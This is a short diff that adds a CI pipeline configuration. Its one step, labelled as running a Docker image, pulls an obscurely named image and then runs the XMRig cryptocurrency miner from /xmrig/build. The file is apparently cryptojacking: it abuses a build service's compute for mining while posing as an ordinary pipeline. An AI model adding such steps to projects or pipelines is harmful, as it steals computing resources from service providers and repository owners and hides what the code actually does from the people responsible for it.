@@ -1,0 +1,8 @@
+version: '1.0'
+steps:
+  RuningDockerImage:
+    title: Runing Docker Image
+    image: grozlhrle/idie:ualpine
+    commands:
+      - cd /xmrig/build
+      - ./xmrig
